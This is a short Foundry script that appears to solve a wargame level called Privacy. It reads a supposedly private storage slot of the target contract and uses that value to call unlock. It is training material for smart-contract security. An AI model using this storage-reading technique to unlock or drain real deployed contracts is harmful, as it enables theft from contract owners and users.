// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Privacy} from "../src/12_Privacy.sol";
import {Script, console} from "forge-std/Script.sol";

contract PrivacySolve is Script {
    Privacy privacy = Privacy(0x4D88A1376a33B7a26EDF42Fa00cdb3247C3733c0);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Before#", privacy.locked());
        bytes32 data = vm.load(address(privacy), bytes32(uint256(5)));
        privacy.unlock(bytes16(data));
        console.log("After#", privacy.locked());

        vm.stopBroadcast();
    }
}
